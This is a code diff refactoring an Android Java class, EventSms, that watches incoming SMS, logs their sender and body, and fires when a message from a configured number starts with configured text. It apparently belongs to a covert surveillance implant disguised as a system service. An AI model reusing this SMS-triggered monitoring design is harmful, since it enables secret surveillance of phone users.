@@ -13,13 +13,15 @@ import java.io.IOException;
 
 import com.android.service.Sms;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerSms;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
-public class EventSms extends EventBase implements Observer<Sms> {
+public class EventSms extends BaseEvent implements Observer<Sms> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventSms"; //$NON-NLS-1$
 
@@ -27,42 +29,25 @@ public class EventSms extends EventBase implements Observer<Sms> {
 	private String number, msg;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerSms.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerSms.self().detach(this);
+		onExit(); // di sicurezza
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
-		super.setEvent(event);
-
-		final byte[] conf = event.getParams();
-
-		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-
+	public boolean parse(ConfEvent conf) {
 		try {
-			actionOnEnter = event.getAction();
+			number = conf.getString("number");
+			msg = conf.getString("text");
 
-			// Estraiamo il numero di telefono
-			byte[] num = new byte[databuffer.readInt()];
-			databuffer.read(num);
-
-			number = WChar.getString(num, true).toLowerCase();
-
-			// Estraiamo il messaggio atteso
-			byte[] text = new byte[databuffer.readInt()];
-			databuffer.read(text);
-
-			msg = WChar.getString(text, true).toLowerCase();
-
-			num = text = null;
-		} catch (final IOException e) {
+		} catch (final ConfigurationException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
+				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -71,20 +56,20 @@ public class EventSms extends EventBase implements Observer<Sms> {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		// TODO Auto-generated method stub
 	}
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Sms s) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody()) ;//$NON-NLS-1$ //$NON-NLS-2$
+			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());//$NON-NLS-1$ //$NON-NLS-2$
 		}
-		
+
 		if (s.getAddress().toLowerCase().endsWith(this.number) == false) {
 			return 0;
 		}
-		
+
 		// Case insensitive
 		if (s.getBody().toLowerCase().startsWith(this.msg) == false) {
 			return 0;
@@ -94,7 +79,5 @@ public class EventSms extends EventBase implements Observer<Sms> {
 		return 1;
 	}
 
-	public void onEnter() {
-		trigger(actionOnEnter);
-	}
+
 }
